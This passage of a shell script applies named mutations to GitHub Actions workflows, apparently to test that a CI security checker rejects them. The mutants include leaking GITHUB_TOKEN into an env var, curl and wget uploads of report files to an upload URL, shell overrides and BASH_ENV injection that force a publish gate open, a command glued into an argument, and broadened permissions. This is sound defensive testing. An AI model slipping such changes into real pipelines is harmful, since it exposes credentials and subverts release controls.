	replace "$TEST_WF" '      decision: ${{ steps.scope.outputs.decision }}' '      decision: ${{ steps.scope.outputs.mode }}'
	;;
scope-step-id)
	replace "$TEST_WF" '        id: scope' '        id: wrong'
	;;
scope-force-full-unbound)
	replace "$TEST_WF" '      - name: Emit FULL-only bootstrap decision
        id: scope
        env:
          FORCE_FULL: ${{ vars.PMCP_CI_FORCE_FULL }}' '      - name: Emit FULL-only bootstrap decision
        id: scope
        env:
          FORCE_FULL: ""'
	;;
gate-job-name)
	replace "$TEST_WF" '  ci-required:
' '  ci-required:
    name: harmless
'
	;;
gate-matrix)
	replace "$TEST_WF" '  ci-required:
' '  ci-required:
    strategy:
      matrix:
        slot: [one, two]
'
	;;
workflow-shell-default)
	replace "$TEST_WF" '
jobs:
' '
defaults:
  run:
    shell: bash -c "exit 0" -- {0}
jobs:
'
	;;
audit-step-skipped)
	replace "$TEST_WF" '      - name: pip-audit (locked dependencies)' '      - name: pip-audit (locked dependencies)
        if: false'
	;;
audit-step-best-effort)
	replace "$TEST_WF" '      - name: pip-audit (locked dependencies)' '      - name: pip-audit (locked dependencies)
        continue-on-error: true'
	;;
audit-command-omitted)
	replace "$TEST_WF" 'uv run --locked --with pip-audit==2.9.0 pip-audit' 'true # omitted audit'
	;;
test-path-filtered)
	replace "$TEST_WF" '  pull_request:
    branches: [main]' '  pull_request:
    branches: [main]
    paths: ["src/**"]'
	;;
gate-context-collision)
	replace "$TEST_WF" '  lint:
' '  lint:
    name: ci-required
'
	;;
gate-context-cross-workflow)
	replace "$MAINTENANCE" '
jobs:
' '
jobs:
  shadow:
    name: ci-required
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - run: echo collision
'
	;;

integration-cancelled)
	replace "$TEST_WF" "  cancel-in-progress: \${{ github.event_name == 'pull_request' }}" '  cancel-in-progress: true'
	;;
integration-shared-group)
	replace_re "$TEST_WF" '^  group: .+$' '  group: ${{ github.workflow }}-${{ github.ref }}'
	;;
image-docker-main-push)
	replace "$DOCKER_WF" 'on:
  pull_request:' 'on:
  push:
    branches: [main]
  pull_request:'
	;;
image-docker-tag-push)
	replace "$DOCKER_WF" 'on:
  pull_request:' 'on:
  push:
    tags:
      - "v*"
  pull_request:'
	;;
image-docker-pull-request-target)
	replace "$DOCKER_WF" '  pull_request:
    branches: [main]' '  pull_request_target:
    branches: [main]'
	;;
image-docker-push-expression)
	replace "$DOCKER_WF" '          push: false' "          push: \${{ github.event_name != 'pull_request' }}"
	;;
image-docker-packages-write)
	replace "$DOCKER_WF" '      contents: read
' '      contents: read
      packages: write
'
	;;
image-docker-login)
	replace "$DOCKER_WF" '      - name: Extract metadata
' "      - name: Log in to Container Registry
        uses: docker/login-action@${FAKE_SHA} # v4.6.0
        with:
          registry: \${{ env.REGISTRY }}
          username: \${{ github.actor }}
          password: \${{ github.token }}

      - name: Extract metadata
"
	;;
image-docker-cache-to)
	replace "$DOCKER_WF" '          cache-from: type=gha
' '          cache-from: type=gha
          cache-to: type=gha,mode=max
'
	;;
image-docker-secrets)
	replace "$DOCKER_WF" '  IMAGE_NAME: ${{ github.repository }}
' '  IMAGE_NAME: ${{ github.repository }}
  LEAK: ${{ secrets.GITHUB_TOKEN }}
'
	;;
image-docker-extra-job)
	replace "$DOCKER_WF" 'jobs:
  build:
' 'jobs:
  extra:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    permissions:
      contents: read
    steps:
      - run: echo extra
  build:
'
	;;
image-tag-allowlist-docker)
	replace "$CHECKER" 'TAG_TRIGGERED_WORKFLOWS = {"release.yml"}' 'TAG_TRIGGERED_WORKFLOWS = {"release.yml", "docker.yml"}'
	;;
image-workflow-packages-write)
	replace "$IMAGE_WF" '
permissions: {}
' '
permissions:
  packages: write
'
	;;
image-job-write-all)
	replace "$IMAGE_WF" '    permissions:
      actions: read
      contents: read
' '    permissions: write-all
'
	;;
image-promote-contents-dropped)
	replace "$IMAGE_WF" '    permissions:
      contents: read
      packages: write
' '    permissions:
      packages: write
'
	;;
image-watch-packages-write)
	replace "$WATCH_WF" '    permissions:
      contents: read
      actions: read
      packages: read
' '    permissions:
      contents: read
      actions: read
      packages: write
'
	;;
image-job-no-permissions-image)
	replace "$IMAGE_WF" '    permissions:
      contents: read
    outputs:
' '    outputs:
'
	;;
image-job-no-permissions-watch)
	replace "$WATCH_WF" '    permissions:
      contents: read
      actions: read
      packages: read
' ''
	;;
image-job-no-permissions-docker)
	replace "$DOCKER_WF" '    permissions:
      contents: read
' ''
	;;
image-docker-push-step)
	replace "$IMAGE_WF" '      - name: Keep the verified archive for promotion
' '      - run: docker push pmcp-image-smoke:candidate
      - name: Keep the verified archive for promotion
'
	;;
image-buildx-push)
	replace "$IMAGE_WF" '--no-cache --output' '--no-cache --push --output'
	;;
image-type-registry)
	replace "$IMAGE_WF" 'type=oci,dest=$RUNNER_TEMP/image.oci.tar' 'type=registry,name=example.invalid/pmcp'
	;;
image-curl-put)
	replace "$IMAGE_WF" '      - name: Keep the verified archive for promotion
' '      - run: curl -X PUT https://ghcr.io/v2/consiliency/pmcp/manifests/main
      - name: Keep the verified archive for promotion
'
	;;
image-skopeo-delete)
	replace "$IMAGE_WF" '      - name: Keep the verified archive for promotion
' '      - run: skopeo delete docker://example.invalid/pmcp:main
      - name: Keep the verified archive for promotion
'
	;;
image-crane)
	replace "$IMAGE_WF" '      - name: Keep the verified archive for promotion
' '      - run: crane copy example.invalid/a example.invalid/b
      - name: Keep the verified archive for promotion
'
	;;
image-oras)
	replace "$IMAGE_WF" '      - name: Keep the verified archive for promotion
' '      - run: oras push example.invalid/pmcp:main image.oci.tar
      - name: Keep the verified archive for promotion
'
	;;
image-regctl)
	replace "$IMAGE_WF" '      - name: Keep the verified archive for promotion
' '      - run: regctl image copy example.invalid/a example.invalid/b
      - name: Keep the verified archive for promotion
'
	;;
image-podman-push)
	replace "$IMAGE_WF" '      - name: Keep the verified archive for promotion
' '      - run: podman push pmcp-image-smoke:candidate
      - name: Keep the verified archive for promotion
'
	;;
image-buildah-push)
	replace "$IMAGE_WF" '      - name: Keep the verified archive for promotion
' '      - run: buildah push pmcp-image-smoke:candidate
      - name: Keep the verified archive for promotion
'
	;;
image-promote-outside)
	replace "$IMAGE_WF" '      - name: Keep the verified archive for promotion
' '      - run: python3 -I -B trusted/scripts/image_publish.py promote --help
      - name: Keep the verified archive for promotion
'
	;;
image-stray-ghcr)
	replace "$IMAGE_WF" '      - name: Keep the verified archive for promotion
' '      - run: echo ghcr.io
      - name: Keep the verified archive for promotion
'
	;;
image-promote-if-vars)
	replace "$IMAGE_WF" "    if: \${{ needs.gate.outputs.open == 'yes' }}" "    if: vars.PMCP_IMAGE_PUBLISH == 'enabled'"
	;;
image-needs-gate-dropped)
	replace "$IMAGE_WF" '    needs: [gate, verify-upstream, build-smoke]' '    needs: [verify-upstream, build-smoke]'
	;;
image-needs-verify-dropped)
	replace "$IMAGE_WF" '    needs: [gate, verify-upstream, build-smoke]' '    needs: [gate, build-smoke]'
	;;
image-http-notify-put)
	replace "$MAINTENANCE" '-X POST "$WORKER_URL/events/github"' '-X PUT "$WORKER_URL/events/github"'
	;;
image-http-notify-url-repointed)
	replace "$MAINTENANCE" '          WORKER_URL: ${{ vars.CONSILIENCY_WORKER_URL }}' '          WORKER_URL: ${{ vars.OTHER_UPLOAD_URL }}'
	;;
image-http-notify-curlrc)
	replace "$MAINTENANCE" '      - name: Notify maintenance worker
' "      - name: Configure curl
        run: printf 'request = PUT\\n' > \"\$HOME/.curlrc\"
      - name: Notify maintenance worker
"
	;;
image-http-notify-copied)
	MUT_FILE="$MAINTENANCE" python3 - <<'PY'
import os
import pathlib
import sys

path = pathlib.Path(os.environ["MUT_FILE"])
text = path.read_text()
marker = "\n  notify-worker:\n"
if text.count(marker) != 1:
    sys.exit(f"mutation anchor matched {text.count(marker)} times (expected exactly 1) in {path}")
job = text.split(marker, 1)[1]
path.write_text(text.rstrip("\n") + "\n  notify-worker-copy:\n" + job)
PY
	;;
image-http-upload-T)
	replace "$WHEEL_WF" '      - name: Retain public compatibility identity
' '      - run: curl -sfT "$RUNNER_TEMP/published-wheel/report.json" "$UPLOAD_URL"
      - name: Retain public compatibility identity
'
	;;
image-http-data-d)
	replace "$WHEEL_WF" '      - name: Retain public compatibility identity
' '      - run: curl -sd @"$RUNNER_TEMP/published-wheel/report.json" "$UPLOAD_URL"
      - name: Retain public compatibility identity
'
	;;
image-http-wget-post-file)
	replace "$WHEEL_WF" '      - name: Retain public compatibility identity
' '      - run: wget --post-file="$RUNNER_TEMP/published-wheel/report.json" "$UPLOAD_URL"
      - name: Retain public compatibility identity
'
	;;
image-http-step-shell)
	replace "$WHEEL_WF" '      - name: Retain public compatibility identity
' '      - shell: curl -sf -X PUT --data-binary @{0} "$UPLOAD_URL"
        run: echo report
      - name: Retain public compatibility identity
'
	;;
image-http-defaults-shell)
	replace "$WHEEL_WF" 'permissions:
  contents: read

jobs:' 'permissions:
  contents: read

defaults:
  run:
    shell: curl -sf -X PUT --data-binary @{0} "$UPLOAD_URL" --
jobs:'
	;;
image-gate-workflow-env)
	replace "$IMAGE_WF" '
permissions: {}
' '
permissions: {}

env:
  BASH_ENV: '"'"'$(echo open=yes >>"$GITHUB_OUTPUT")'"'"'
'
	;;
image-gate-workflow-defaults)
	replace "$IMAGE_WF" '
permissions: {}
' '
permissions: {}

defaults:
  run:
    shell: bash -c '"'"'echo open=yes >> "$GITHUB_OUTPUT"'"'"' {0}
'
	;;
image-http-quoted-separator)
	replace "$WHEEL_WF" '      - name: Retain public compatibility identity
' '      - run: curl -sf "$UPLOAD_URL?a=1&b=2" -X PUT
      - name: Retain public compatibility identity
'
	;;
image-http-attached-value)
	replace "$WHEEL_WF" '      - name: Retain public compatibility identity
' '      - run: curl -sf -d@report.json "$UPLOAD_URL"
      - name: Retain public compatibility identity
'
	;;
image-http-quoted-method)
	replace "$WHEEL_WF" '      - name: Retain public compatibility identity
' '      - run: curl -sf -X"PUT" "$UPLOAD_URL"
      - name: Retain public compatibility identity
'
	;;
image-docker-image-push)
	replace "$WHEEL_WF" '      - name: Retain public compatibility identity
' '      - run: docker image push "$IMAGE_REF"
      - name: Retain public compatibility identity
'
	;;
image-skopeo-smoke-glued)
	replace "$IMAGE_WF" 'docker-daemon:pmcp-image-smoke:candidate' 'docker-daemon:pmcp-image-smoke:candidate;skopeo copy docker://example.invalid/a:t docker://example.invalid/b:t'
	;;
image-needs-reordered)
	replace "$IMAGE_WF" '    needs: [gate, verify-upstream, build-smoke]' '    needs: [build-smoke, gate, verify-upstream]'
	;;
image-gate-lower)
	replace "$IMAGE_WF" 'if os.environb.get(b"PMCP_IMAGE_PUBLISH") == b"enabled":' 'if os.environb.get(b"PMCP_IMAGE_PUBLISH", b"").lower() == b"enabled":'
	;;
image-gate-literal-output)
	replace "$IMAGE_WF" '      open: ${{ steps.decide.outputs.open }}' "      open: 'yes'"
	;;
image-gate-extra-step)
	replace "$IMAGE_WF" '          PY

  verify-upstream:' '          PY
      - run: echo open=yes >> "$GITHUB_OUTPUT"

  verify-upstream:'
	;;
image-gate-literal-env)
	replace "$IMAGE_WF" '      - id: decide
        env:
          PMCP_IMAGE_PUBLISH: ${{ vars.PMCP_IMAGE_PUBLISH }}' '      - id: decide
        env:
          PMCP_IMAGE_PUBLISH: enabled'
	;;
image-gate-if)
	replace "$IMAGE_WF" '  gate:
    runs-on: ubuntu-latest' "  gate:
    if: github.actor != 'nobody'
    runs-on: ubuntu-latest"
	;;
image-candidate-ref-head-sha)
	replace "$IMAGE_WF" '          ref: ${{ needs.verify-upstream.outputs.head_sha }}' '          ref: ${{ github.event.workflow_run.head_sha }}'
	;;
image-persist-credentials)
	replace "$IMAGE_WF" '          persist-credentials: false
          path: candidate' '          persist-credentials: true
          path: candidate'
	;;
image-trusted-ref-main)
	replace "$IMAGE_WF" '          ref: ${{ github.workflow_sha }}
          sparse-checkout: scripts/image_publish.py
          sparse-checkout-cone-mode: false
          persist-credentials: false
          path: trusted' '          ref: main
          sparse-checkout: scripts/image_publish.py
          sparse-checkout-cone-mode: false
          persist-credentials: false
          path: trusted'
	;;
image-cone-mode)
	replace "$IMAGE_WF" '          sparse-checkout-cone-mode: false
          persist-credentials: false

      - name: Verify the upstream Test run' '          sparse-checkout-cone-mode: true
          persist-credentials: false

      - name: Verify the upstream Test run'
	;;
image-watch-baselines-dropped)
	replace "$WATCH_WF" '            .consiliency/evidence/image-baselines/*
' ''
	;;
image-gate-checkout)
	replace "$IMAGE_WF" '      - id: decide
' "      - uses: actions/checkout@${FAKE_SHA} # v7.0.1
      - id: decide
"
	;;
image-git-clone)
	replace "$IMAGE_WF" '        run: python3 -I -B scripts/image_publish.py verify-upstream' '        run: git clone https://github.com/Consiliency/pmcp src && python3 -I -B scripts/image_publish.py verify-upstream'
	;;
image-curl-contents)
	replace "$IMAGE_WF" '      - name: Verify the upstream Test run
' '      - run: curl -fsSL -o scripts/image_publish.py https://api.github.com/repos/Consiliency/pmcp/contents/scripts/image_publish.py
      - name: Verify the upstream Test run
'
	;;
image-run-head-sha)
	replace "$IMAGE_WF" '        run: docker buildx build' '        run: echo "${{ github.event.workflow_run.head_sha }}"; docker buildx build'
	;;
image-download-run-id)
	replace "$IMAGE_WF" '          name: candidate-oci
          path: ${{ runner.temp }}/candidate
' '          name: candidate-oci
          path: ${{ runner.temp }}/candidate
          run-id: 1
'
	;;
image-cancel-in-progress)
	replace "$IMAGE_WF" '      cancel-in-progress: false' '      cancel-in-progress: true'
	;;
image-trigger-push-tags)
	replace "$IMAGE_WF" 'on:
  workflow_run:' 'on:
  push:
    tags: ["v*"]
  workflow_run:'
	;;
image-trigger-workflow-call)
	replace "$IMAGE_WF" 'on:
  workflow_run:' 'on:
  workflow_call:
  workflow_run:'
	;;
image-trigger-schedule)
	replace "$IMAGE_WF" 'on:
  workflow_run:' 'on:
  schedule:
    - cron: "0 1 * * *"
  workflow_run:'
	;;
image-trigger-repository-dispatch)
	replace "$IMAGE_WF" 'on:
  workflow_run:' 'on:
  repository_dispatch:
  workflow_run:'
	;;
image-trigger-workflow-dispatch)
	replace "$IMAGE_WF" 'on:
  workflow_run:' 'on:
  workflow_dispatch:
  workflow_run:'
	;;
image-types-requested)
	replace "$IMAGE_WF" '    types: [completed]' '    types: [requested]'
	;;
image-branches-removed)
	replace "$IMAGE_WF" '    types: [completed]
    branches: [main]
' '    types: [completed]
'
	;;
image-tag-caller)
	cat >"${REPO_ROOT}/.github/workflows/image-tag.yml" <<'YAML'
name: Image tag
on:
  push:
    tags:
      - "v*"
jobs:
  publish:
    uses: ./.github/workflows/image.yml
YAML
	;;
image-watch-push)
	replace "$WATCH_WF" 'on:
  schedule:' 'on:
  push:
    branches: [main]
  schedule:'
	;;
image-watch-pull-request)
	replace "$WATCH_WF" 'on:
  schedule:' 'on:
  pull_request:
  schedule:'
	;;
image-ack-docker)
	replace "$TEST_WF" '(release|test|docker|image|image-watch)\.yml' '(release|test|image|image-watch)\.yml'
	;;
image-ack-image)
	replace "$TEST_WF" '(release|test|docker|image|image-watch)\.yml' '(release|test|docker|image-watch)\.yml'
	;;
image-ack-dockerfile)
	replace "$TEST_WF" '|Dockerfile|' '|'
	;;
image-ack-baselines)
	replace "$TEST_WF" '|\.consiliency/evidence/image-baselines/.+|' '|'
	;;
*)
	echo "unhandled mutant: ${NAME}" >&2
	exit 2
	;;
esac

echo "applied mutant: ${NAME}"
